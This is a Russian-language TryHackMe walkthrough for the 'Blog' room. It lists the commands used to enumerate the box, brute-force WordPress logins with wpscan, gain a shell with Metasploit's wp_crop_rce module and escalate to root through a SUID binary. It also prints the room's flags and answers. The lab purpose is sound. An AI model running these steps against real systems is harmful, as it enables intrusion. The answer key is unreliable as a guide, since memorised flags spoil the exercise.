[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Blog](https://tryhackme.com/r/room/blog) 

Всего 2 задания:
## Задание 1
Билли Джоэл создал блог на своем домашнем компьютере и начал над ним работать. Это будет так здорово!

Перечислите этот ящик и найдите 2 флага, которые в нем спрятаны! У Билли на ноутбуке происходят какие-то странные 
вещи. Сможете ли вы маневрировать и получить то, что вам нужно? Или вы упадете в кроличью нору...

Чтобы блог работал с AWS, вам необходимо добавить MACHINE_IP blog.thm в файл `/etc/hosts`.

Спасибо Sq00ky за идею root privesc ;)

### Ответьте на вопросы ниже
корень.txt
```commandline
nmap -sC -sV <IP>
smbclient -L //<IP>
smbclient -L //<IP>/BillySMB
get Alice-White-Rabbit.jpg
get tswift.mp4 
get check-this.png
exit
steghide extract -sf Alice-White-Rabbit.jpg
cat rabbit_hole.txt
zbarimg -q --raw check-this.png

vim /etc/hosts
blog.thm 10.10.10.32

wpscan --url http://blog.thm --enumerate u
wpscan -U users.txt -P /usr/share/wordlists/rockyou.txt --url http://blog.thm
# kwheel / cutiepie1 
searchsploit wordpress 5.0.0

msfconsole -q
use exploit/multi/http/wp_crop_rce
show options
set rhost blog.thm
set username kwheel
set password cutiepie1
exploit
shell
SHELL=/bin/bash script -q /dev/null
find / -type f -user root -perm -u=s 2>/dev/null
file /usr/sbin/checker
ltrace /usr/sbin/checker
export admin=1
```
```commandline
9a0b2b618bef9bfa7ac28c1353d9f318
```
пользователь.txt
```commandline
find / -type f -name user.txt 2>/dev/null
cat /media/usb/user.txt
```
```commandline
c8421899aae571f7af486492b71a8ab7
```
Где был найден user.txt?
```commandline
/media/usb
```
Какую CMS использовал Билли?
```commandline
Wordpress
```
Какая версия вышеуказанной CMS использовалась?
```commandline
5.0
```

## Задание 2
#### Ответьте на вопросы ниже
Поздравляю!
```commandline
Ответ не нужен
```


[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)